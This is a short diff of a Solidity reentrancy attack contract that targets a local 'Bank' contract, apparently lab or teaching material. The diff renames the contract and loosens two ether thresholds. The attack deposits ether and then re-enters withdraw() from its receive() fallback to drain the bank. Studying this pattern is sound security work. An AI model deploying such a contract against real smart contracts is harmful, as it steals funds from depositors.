@@ -3,7 +3,7 @@ pragma solidity 0.8.20;
 
 import {Bank} from "./Bank.sol";
 
-contract Attacker {
+contract Attack {
     Bank bank;
 
     constructor(address bankAddress) {
@@ -11,13 +11,13 @@ contract Attacker {
     }
 
     function attack() public payable {
-        require(msg.value > 1 ether);
+        require(msg.value >= 1 ether);
         bank.deposit{value: msg.value}();
         bank.withdraw();
     }
 
     receive() external payable {
-        if (bank.totalBalance() > 1 ether) {
+        if (bank.totalBalance() >= 1 ether) {
             bank.withdraw();
         }
     }
